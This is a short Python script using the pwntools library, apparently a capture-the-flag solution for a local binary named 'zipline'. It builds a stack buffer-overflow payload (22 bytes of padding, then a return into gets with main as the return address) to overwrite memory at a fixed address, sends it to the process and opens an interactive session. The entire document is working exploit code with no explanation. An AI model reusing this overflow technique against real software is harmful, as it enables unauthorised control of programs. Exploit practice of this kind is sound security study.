from pwn import *

e = ELF('./zipline')
p = process('./zipline')

payload = 'A'*22
payload += p32(e.symbols['gets'])
payload += p32(e.symbols['main'])
payload += p32(0x804c041)

print p.recvuntil('hell?\n')
p.sendline(payload)
p.sendline('A'*8)
p.interactive()
